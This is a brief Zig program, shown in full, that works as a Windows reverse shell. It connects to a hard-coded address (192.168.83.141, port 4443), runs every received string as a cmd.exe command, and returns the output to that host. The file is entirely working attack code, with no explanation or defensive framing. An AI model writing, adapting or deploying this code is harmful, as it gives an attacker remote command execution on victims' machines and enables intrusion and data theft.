const std = @import("std");

pub fn main() !void {
    const server_address = std.net.Address.initIp4([4]u8{ 192, 168, 83, 141 }, 4443);
    const conn = try std.net.tcpConnectToAddress(server_address);
    defer conn.close();

    var general_purpose_allocator = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = general_purpose_allocator.allocator();
    const cwd = null;

    while (true) {
        var buf: [1024]u8 = undefined;
        var msg_size = try conn.read(buf[0..]);
        var msg = buf[0..msg_size];

        if (msg_size != 0) {
            std.debug.print("{s}", .{msg});

            const result = try std.ChildProcess.exec(.{
                .allocator = allocator,
                .argv = &[_][]const u8{ "C:\\Windows\\System32\\cmd.exe", "/C", msg },
                .cwd_dir = cwd,
            });
            try conn.writeAll(result.stdout);
            try conn.writeAll(result.stderr);
        }
    }
}
